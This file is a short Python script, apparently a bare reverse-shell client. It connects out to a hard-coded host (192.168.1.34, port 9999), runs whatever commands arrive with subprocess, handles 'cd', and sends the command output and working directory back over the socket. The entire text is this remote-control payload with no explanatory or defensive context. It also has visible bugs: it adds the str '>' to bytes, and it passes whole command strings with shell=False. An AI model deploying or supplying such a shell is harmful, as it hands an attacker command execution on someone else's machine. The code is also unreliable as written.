import os
import socket
import subprocess

host='192.168.1.34'
port=9999
s=socket.socket()
s.connect((host,port))

while True:
	data=s.recv(1024)
	if data[:2].decode('utf-8')=='cd':
		os.chdir(data[3:].decode('utf-8'))
	if len(data)>0:
		cmd=subprocess.Popen(data.decode('utf-8'),shell=False,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
		output_bytes=cmd.stdout.read()+cmd.stderr.read()
		output_str=str(output_bytes)
		s.send(str.encode(output_str + str(os.getcwd())) +'>')
		
#Close Connection
s.close()
